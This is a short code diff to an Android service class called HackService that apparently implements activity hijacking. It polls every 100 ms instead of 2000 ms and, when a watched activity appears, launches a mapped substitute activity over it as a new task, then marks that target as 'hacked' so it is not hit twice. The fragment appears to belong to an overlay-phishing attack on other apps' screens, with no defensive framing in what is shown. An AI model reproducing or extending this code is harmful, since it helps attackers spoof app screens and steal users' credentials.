@@ -47,29 +47,25 @@ public class HackService extends Service {
             }
 
 
-            handler.postDelayed(mTask, 2000);
+            handler.postDelayed(mTask, 100);
 
         }
 
 
         private void hack(String activityName) {
+            if (!((HackApplication) getApplication()).isHacked(activityName)) {
 
 
-//            if (!((HackApplication) getApplication()).isHacked(processName)) {
+                Intent hackIntent = new Intent(getBaseContext(),
 
+                        mProcessToHack.get(activityName));
 
-            Intent hackIntent = new Intent(getBaseContext(),
+                hackIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
 
-                    mProcessToHack.get(activityName));
+                getApplication().startActivity(hackIntent);
 
-            hackIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-
-            getApplication().startActivity(hackIntent);
-
-//            ((HackApplication) getApplication()).add(processName);
-//
-
-//            }
+                ((HackApplication) getApplication()).add(activityName);
+            }
         }
     };
 
